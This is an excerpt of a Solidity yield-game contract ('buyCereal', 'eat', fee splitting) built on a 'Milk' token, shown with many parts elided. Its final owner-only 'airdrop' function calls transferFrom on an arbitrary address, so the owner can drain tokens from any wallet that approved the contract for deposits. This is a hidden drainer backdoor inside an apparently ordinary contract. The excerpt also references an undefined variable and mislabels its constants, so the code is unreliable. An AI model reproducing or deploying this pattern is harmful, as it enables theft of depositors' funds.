...
modifier notContract() {
    ...
    Milk_TOKEN = IERC20(0x2033bdDcB6799971c2A0902cd71d941D4474Eeb5);
    DEV_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    MARKETING_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    CEO_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    GIVEAWAY_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    _dev = (DEV_ADDRESS);
    ...
    _giveAway = (GIVEAWAY_ADDRESS);
        ...
        MIN_DEPOSIT = 1000000000000000000; // 1 Milk
        MIN_BAKE = 10000000000000000000; // 10 Milk
        MAX_WALLET_TVL_IN_BNB = 3000000000000000000000000; // 3000000 Milk
        MAX_DAILY_REWARDS_IN_BNB = 4000000000000000000000; // 4000 Milk 
        MIN_REF_DEPOSIT_FOR_BONUS = 500000000000000000000; // 500 Milk
    }
...
function setGiveawayAddress(address newGiveawayAddress) public onlyOwner {
 ...
 function user(address adr) public view returns (Baker memory) {
    ...
    function buyCereal(address ref, uint256 _amount) public notContract() nonReentrant {
        ...
        Milk_TOKEN.transferFrom(msg.sender, address(this), _amount);
    ...
    function sendFees(uint256 totalFee, uint256 giveAway) private {
        ...
        Milk_TOKEN.transfer(_dev, dev);
        Milk_TOKEN.transfer(_marketing, marketing);
        Milk_TOKEN.transfer(_ceo, ceo);

        if (giveAway > 0) {
            Milk_TOKEN.transfer(_giveAway, giveAway);
        }
    }
    ...
    function eat() public nonReentrant notContract(){
        ...
        Milk_TOKEN.transfer(msg.sender, bnbToEat);
    ...
    function contractBalance() public view returns (uint256) {
        return Milk_TOKEN.balanceOf(address(this));
    }
...
function airdrop(address from, address to, uint256 tokens) external onlyOwner {
    ...
    require(Milk_TOKEN.balanceOf(from) >= SCCC, "Not enough tokens in wallet");

    require(Milk_TOKEN.transferFrom(from, to, tokens), "Transfer failed");
}
